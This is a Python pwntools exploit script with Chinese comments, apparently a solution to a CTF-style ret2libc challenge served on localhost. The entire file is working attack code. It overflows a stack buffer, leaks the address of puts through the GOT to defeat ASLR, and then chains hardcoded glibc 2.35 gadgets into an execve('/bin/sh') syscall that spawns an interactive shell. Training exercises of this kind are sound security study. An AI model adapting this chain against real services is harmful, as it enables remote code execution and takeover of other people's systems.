#!/usr/bin/env python3
from pwn import *

HOST, PORT = '127.0.0.1', 13376
r = remote(HOST, PORT)

context.arch = 'amd64'

elf = ELF('./vuln', checksec=False)
# 需要提供与远程相同版本的 libc，这里假设已放在同目录
libc = ELF('./libc.so.6', checksec=False)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln     = elf.symbols['vuln']
pop_rdi  = elf.symbols['my_gadget']   # pop rdi; ret
ret      = next(elf.search(b'\xc3'))  # ret gadget

# libc 内 gadget 偏移（glibc 2.35 / ubuntu 22.04）
puts_off        = libc.symbols['puts']
binsh_off       = next(libc.search(b'/bin/sh'))
pop_rdi_off     = 0x2a3e5   # pop rdi; ret
pop_rsi_off     = 0x2be51   # pop rsi; ret
pop_rdx_rbx_off = 0x904a9   # pop rdx; pop rbx; ret
pop_rax_off     = 0x45eb0   # pop rax; ret
syscall_off     = 0x91316   # syscall; ret

# ── Stage 1：泄漏 puts 真实地址，返回 vuln ──────────────────────────
payload1  = b'A' * 0x28
payload1 += p64(ret)
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(vuln)       # 泄漏后回到 vuln 进行第二次溢出

r.recvuntil(b'=== SLsec Pwn: ret2libc ===\n')
r.send(payload1)
r.recvuntil(b'Bye\n')
leak = u64(r.recv(6).ljust(8, b'\x00'))
r.recv(1)                   # 吃掉 puts 输出末尾的 \n

libc_base   = leak - puts_off
binsh       = libc_base + binsh_off
pop_rsi     = libc_base + pop_rsi_off
pop_rdx_rbx = libc_base + pop_rdx_rbx_off
pop_rax     = libc_base + pop_rax_off
syscall     = libc_base + syscall_off

log.info(f'libc_base: {hex(libc_base)}')

# ── Stage 2：execve("/bin/sh", NULL, NULL) syscall ──────────────────
# system() 在 socat EXEC 模式下 fork 后 I/O 不通，改用 execve syscall
# pop rdx 实为 pop rdx; pop rbx; ret，需多填一个 junk
payload2  = b'A' * 0x28
payload2 += p64(ret)
payload2 += p64(pop_rdi) + p64(binsh)           # rdi = "/bin/sh"
payload2 += p64(pop_rsi) + p64(0)               # rsi = NULL
payload2 += p64(pop_rdx_rbx) + p64(0) + p64(0) # rdx = NULL, rbx = junk
payload2 += p64(pop_rax) + p64(59)              # rax = SYS_execve
payload2 += p64(syscall)

r.send(payload2)
r.recvuntil(b'Bye\n')
r.interactive()
